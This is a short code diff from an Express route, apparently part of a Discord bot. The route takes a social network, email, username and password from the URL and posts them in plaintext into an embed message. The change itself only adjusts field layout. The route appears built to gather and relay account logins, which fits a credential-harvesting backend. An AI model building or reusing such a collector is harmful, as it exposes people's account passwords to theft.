@@ -92,9 +92,9 @@ app.get('/addSocial/:social/:email/:username/:password', (req, res) => {
 	.addFields(
 		{ name: 'Social : ', value: req.params.social },
 		{ name: '\u200B', value: '\u200B' },
-		{ name: 'Username : ', value: req.params.username, inline: true },
-		{ name: 'Email : ', value: req.params.email, inline: true },
-        { name: 'Password : ', value: req.params.password, inline: true}
+		{ name: 'Username : ', value: req.params.username },
+		{ name: 'Email : ', value: req.params.email},
+        { name: 'Password : ', value: req.params.password}
 	)
 	// .setImage('https://i.imgur.com/AfFp7pu.png')
 	.setTimestamp()
